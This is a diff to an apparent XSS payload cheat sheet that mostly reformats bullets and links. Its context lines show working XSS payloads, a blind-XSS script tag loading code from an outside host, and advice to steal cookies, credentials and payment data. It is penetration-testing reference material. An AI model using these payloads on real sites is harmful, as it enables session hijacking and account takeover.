@@ -2,7 +2,6 @@
 
 > Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.
 
-
 ## Summary
 
 - [Methodology](#methodology)
@@ -41,26 +40,23 @@
 - [Labs](#labs)
 - [References](#references)
 
-
 ## Methodology
 
 Cross-Site Scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS allows attackers to inject malicious code into a website, which is then executed in the browser of anyone who visits the site. This can allow attackers to steal sensitive information, such as user login credentials, or to perform other malicious actions.
 
 There are 3 main types of XSS attacks:
 
-* **Reflected XSS**: In a reflected XSS attack, the malicious code is embedded in a link that is sent to the victim. When the victim clicks on the link, the code is executed in their browser. For example, an attacker could create a link that contains malicious JavaScript, and send it to the victim in an email. When the victim clicks on the link, the JavaScript code is executed in their browser, allowing the attacker to perform various actions, such as stealing their login credentials.
+- **Reflected XSS**: In a reflected XSS attack, the malicious code is embedded in a link that is sent to the victim. When the victim clicks on the link, the code is executed in their browser. For example, an attacker could create a link that contains malicious JavaScript, and send it to the victim in an email. When the victim clicks on the link, the JavaScript code is executed in their browser, allowing the attacker to perform various actions, such as stealing their login credentials.
 
-* **Stored XSS**: In a stored XSS attack, the malicious code is stored on the server, and is executed every time the vulnerable page is accessed. For example, an attacker could inject malicious code into a comment on a blog post. When other users view the blog post, the malicious code is executed in their browsers, allowing the attacker to perform various actions.
+- **Stored XSS**: In a stored XSS attack, the malicious code is stored on the server, and is executed every time the vulnerable page is accessed. For example, an attacker could inject malicious code into a comment on a blog post. When other users view the blog post, the malicious code is executed in their browsers, allowing the attacker to perform various actions.
 
-* **DOM-based XSS**: is a type of XSS attack that occurs when a vulnerable web application modifies the DOM (Document Object Model) in the user's browser. This can happen, for example, when a user input is used to update the page's HTML or JavaScript code in some way. In a DOM-based XSS attack, the malicious code is not sent to the server, but is instead executed directly in the user's browser. This can make it difficult to detect and prevent these types of attacks, because the server does not have any record of the malicious code.
+- **DOM-based XSS**: is a type of XSS attack that occurs when a vulnerable web application modifies the DOM (Document Object Model) in the user's browser. This can happen, for example, when a user input is used to update the page's HTML or JavaScript code in some way. In a DOM-based XSS attack, the malicious code is not sent to the server, but is instead executed directly in the user's browser. This can make it difficult to detect and prevent these types of attacks, because the server does not have any record of the malicious code.
 
 To prevent XSS attacks, it is important to properly validate and sanitize user input. This means ensuring that all input meets the necessary criteria, and removing any potentially dangerous characters or code. It is also important to escape special characters in user input before rendering it in the browser, to prevent the browser from interpreting it as code.
-
 
 ## Proof of Concept
 
 When exploiting an XSS vulnerability, it’s more effective to demonstrate a complete exploitation scenario that could lead to account takeover or sensitive data exfiltration. Instead of simply reporting an XSS with an alert payload, aim to capture valuable data, such as payment information, personal identifiable information (PII), session cookies, or credentials.
-
 
 ### Data Grabber
 
@@ -126,7 +122,6 @@ More exploits at [http://www.xss-payloads.com/payloads-list.html?a#category=all]
 - [Redirect Form](http://www.xss-payloads.com/payloads/scripts/redirectform.js.html)
 - [Play Music](http://www.xss-payloads.com/payloads/scripts/playmusic.js.html)
 
-
 ## Identify an XSS Endpoint
 
 This payload opens the debugger in the developer console rather than triggering a popup alert box.
@@ -163,15 +158,15 @@ References:
 - [LiveOverflow Video - DO NOT USE alert(1) for XSS](https://www.youtube.com/watch?v=KHwVjzWei1c)
 - [LiveOverflow blog post - DO NOT USE alert(1) for XSS](https://liveoverflow.com/do-not-use-alert-1-in-xss/)
 
-### Tools 
+### Tools
 
 Most tools are also suitable for blind XSS attacks:
 
-* [XSSStrike](https://github.com/s0md3v/XSStrike): Very popular but unfortunately not very well maintained
-* [xsser](https://github.com/epsylon/xsser): Utilizes a headless browser to detect XSS vulnerabilities
-* [Dalfox](https://github.com/hahwul/dalfox): Extensive functionality and extremely fast thanks to the implementation in Go
-* [XSpear](https://github.com/hahwul/XSpear): Similar to Dalfox but based on Ruby
-* [domdig](https://github.com/fcavallarin/domdig): Headless Chrome XSS Tester
+- [XSSStrike](https://github.com/s0md3v/XSStrike): Very popular but unfortunately not very well maintained
+- [xsser](https://github.com/epsylon/xsser): Utilizes a headless browser to detect XSS vulnerabilities
+- [Dalfox](https://github.com/hahwul/dalfox): Extensive functionality and extremely fast thanks to the implementation in Go
+- [XSpear](https://github.com/hahwul/XSpear): Similar to Dalfox but based on Ruby
+- [domdig](https://github.com/fcavallarin/domdig): Headless Chrome XSS Tester
 
 ## XSS in HTML/Applications
 
@@ -256,7 +251,9 @@ e.g: 14.rs/#alert(document.domain)
 <input type="hidden" accesskey="X" onclick="alert(1)">
 Use CTRL+SHIFT+X to trigger the onclick event
 ```
+
 in newer browsers : firefox-130/chrome-108
+
 ```javascript
 <input type="hidden" oncontentvisibilityautostatechange="alert(1)"  style="content-visibility:auto" >
 ```
@@ -386,8 +383,6 @@ More comprehensive payload with svg tag attribute, desc script, foreignObject sc
 </svg>
 ```
 
-
-
 #### Short SVG Payload
 
 ```javascript
@@ -496,12 +491,12 @@ document.getElementById('btn').onclick = function(e){
 
 > XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service.
 
-XSS Hunter is deprecated, it was available at [https://xsshunter.com/app](https://xsshunter.com/app). 
+XSS Hunter is deprecated, it was available at [https://xsshunter.com/app](https://xsshunter.com/app).
 
-You can set up an alternative version 
+You can set up an alternative version
 
-* Self-hosted version from [mandatoryprogrammer/xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express)
-* Hosted on [xsshunter.trufflesecurity.com](https://xsshunter.trufflesecurity.com/)
+- Self-hosted version from [mandatoryprogrammer/xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express)
+- Hosted on [xsshunter.trufflesecurity.com](https://xsshunter.trufflesecurity.com/)
 
 ```xml
 "><script src="https://js.rip/<custom.name>"></script>
@@ -512,25 +507,25 @@ You can set up an alternative version
 ### Other Blind XSS tools
 
 - [Netflix-Skunkworks/sleepy-puppy](https://github.com/Netflix-Skunkworks/sleepy-puppy) - Sleepy Puppy XSS Payload Management Framework
-- [LewisArdern/bXSS](https://github.com/LewisArdern/bXSS) - bXSS is a utility which can be used by bug hunters and organizations to identify Blind Cross-Site Scripting. 
-- [ssl/ezXSS](https://github.com/ssl/ezXSS) - ezXSS is an easy way for penetration testers and bug bounty hunters to test (blind) Cross Site Scripting. 
+- [LewisArdern/bXSS](https://github.com/LewisArdern/bXSS) - bXSS is a utility which can be used by bug hunters and organizations to identify Blind Cross-Site Scripting.
+- [ssl/ezXSS](https://github.com/ssl/ezXSS) - ezXSS is an easy way for penetration testers and bug bounty hunters to test (blind) Cross Site Scripting.
 
 ### Blind XSS endpoint
 
 - Contact forms
 - Ticket support
 - Referer Header
-  - Custom Site Analytics
-  - Administrative Panel logs
+    - Custom Site Analytics
+    - Administrative Panel logs
 - User Agent
-  - Custom Site Analytics
-  - Administrative Panel logs
+    - Custom Site Analytics
+    - Administrative Panel logs
 - Comment Box
-  - Administrative Panel
+    - Administrative Panel
 
 ### Tips
 
-You can use a [Data grabber for XSS](#data-grabber-for-xss) and a one-line HTTP server to confirm the existence of a blind XSS before deploying a heavy blind-XSS testing tool.
+You can use a [data grabber for XSS](#data-grabber) and a one-line HTTP server to confirm the existence of a blind XSS before deploying a heavy blind-XSS testing tool.
 
 Eg. payload
 
@@ -541,41 +536,34 @@ Eg. payload
 Eg. one-line HTTP server:
 
 ```ps1
-$ ruby -run -ehttpd . -p8080
+ruby -run -ehttpd . -p8080
 ```
 
 ## Mutated XSS
 
 Use browsers quirks to recreate some HTML tags.
 
-**Example**: Mutated XSS from Masato Kinugawa, used against [cure53/DOMPurify](https://github.com/cure53/DOMPurify) component on Google Search. 
+**Example**: Mutated XSS from Masato Kinugawa, used against [cure53/DOMPurify](https://github.com/cure53/DOMPurify) component on Google Search.
 
 ```javascript
 <noscript><p title="</noscript><img src=x onerror=alert(1)>">
 ```
 
-Technical blogposts available at
-
-* https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/
-* https://research.securitum.com/dompurify-bypass-using-mxss/
-
-
 ## Labs
 
-* [PortSwigger Labs for XSS](https://portswigger.net/web-security/all-labs#cross-site-scripting)
-* [Root Me - XSS - Reflected](https://www.root-me.org/en/Challenges/Web-Client/XSS-Reflected)
-* [Root Me - XSS - Server Side](https://www.root-me.org/en/Challenges/Web-Server/XSS-Server-Side)
-* [Root Me - XSS - Stored 1](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)
-* [Root Me - XSS - Stored 2](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-2)
-* [Root Me - XSS - Stored - Filter Bypass](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-filter-bypass)
-* [Root Me - XSS DOM Based - Introduction](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Introduction)
-* [Root Me - XSS DOM Based - AngularJS](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-AngularJS)
-* [Root Me - XSS DOM Based - Eval](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Eval)
-* [Root Me - XSS DOM Based - Filters Bypass](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Filters-Bypass)
-* [Root Me - XSS - DOM Based](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based)
-* [Root Me - Self XSS - DOM Secrets](https://www.root-me.org/en/Challenges/Web-Client/Self-XSS-DOM-Secrets)
-* [Root Me - Self XSS - Race Condition](https://www.root-me.org/en/Challenges/Web-Client/Self-XSS-Race-Condition)
-
+- [PortSwigger Labs for XSS](https://portswigger.net/web-security/all-labs#cross-site-scripting)
+- [Root Me - XSS - Reflected](https://www.root-me.org/en/Challenges/Web-Client/XSS-Reflected)
+- [Root Me - XSS - Server Side](https://www.root-me.org/en/Challenges/Web-Server/XSS-Server-Side)
+- [Root Me - XSS - Stored 1](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)
+- [Root Me - XSS - Stored 2](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-2)
+- [Root Me - XSS - Stored - Filter Bypass](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-filter-bypass)
+- [Root Me - XSS DOM Based - Introduction](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Introduction)
+- [Root Me - XSS DOM Based - AngularJS](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-AngularJS)
+- [Root Me - XSS DOM Based - Eval](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Eval)
+- [Root Me - XSS DOM Based - Filters Bypass](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Filters-Bypass)
+- [Root Me - XSS - DOM Based](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based)
+- [Root Me - Self XSS - DOM Secrets](https://www.root-me.org/en/Challenges/Web-Client/Self-XSS-DOM-Secrets)
+- [Root Me - Self XSS - Race Condition](https://www.root-me.org/en/Challenges/Web-Client/Self-XSS-Race-Condition)
 
 ## References
 
@@ -591,6 +579,7 @@ Technical blogposts available at
 - [Google XSS Turkey - Frans Rosén - June 6, 2015](https://labs.detectify.com/2015/06/06/google-xss-turkey/)
 - [How I found a $5,000 Google Maps XSS (by fiddling with Protobuf) - Marin Moulinier - March 9, 2017](https://medium.com/@marin_m/how-i-found-a-5-000-google-maps-xss-by-fiddling-with-protobuf-963ee0d9caff#.cktt61q9g)
 - [Killing a bounty program, Twice - Itzhak (Zuk) Avraham and Nir Goldshlager - May 2012](http://conference.hitb.org/hitbsecconf2012ams/materials/D1T2%20-%20Itzhak%20Zuk%20Avraham%20and%20Nir%20Goldshlager%20-%20Killing%20a%20Bug%20Bounty%20Program%20-%20Twice.pdf)
+- [Mutation XSS in Google Search -  Tomasz Andrzej Nidecki - April 10, 2019](https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/)
 - [mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations - Mario Heiderich, Jörg Schwenk, Tilman Frosch, Jonas Magazinius, Edward Z. Yang - September 26, 2013](https://cure53.de/fp170.pdf)
 - [postMessage XSS on a million sites - Mathias Karlsson - December 15, 2016](https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/)
 - [RPO that lead to information leakage in Google - @filedescriptor - July 3, 2016](https://web.archive.org/web/20220521125028/https://blog.innerht.ml/rpo-gadgets/)
@@ -609,6 +598,7 @@ Technical blogposts available at
 - [Unleashing an Ultimate XSS Polyglot - Ahmed Elsobky - February 16, 2018](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
 - [Using a Braun Shaver to Bypass XSS Audit and WAF - Frans Rosen - April 19, 2016](http://web.archive.org/web/20160810033728/https://blog.bugcrowd.com/guest-blog-using-a-braun-shaver-to-bypass-xss-audit-and-waf-by-frans-rosen-detectify)
 - [Ways to alert(document.domain) - Tom Hudson (@tomnomnom) - February 22, 2018](https://gist.github.com/tomnomnom/14a918f707ef0685fdebd90545580309)
+- [Write-up of DOMPurify 2.0.0 bypass using mutation XSS - Michał Bentkowski - September 20, 2019](https://research.securitum.com/dompurify-bypass-using-mxss/)
 - [XSS by Tossing Cookies - WeSecureApp - July 10, 2017](https://wesecureapp.com/blog/xss-by-tossing-cookies/)
 - [XSS ghettoBypass - d3adend - September 25, 2015](http://d3adend.org/xss/ghettoBypass)
 - [XSS in Uber via Cookie - zhchbin - August 30, 2017](http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/)
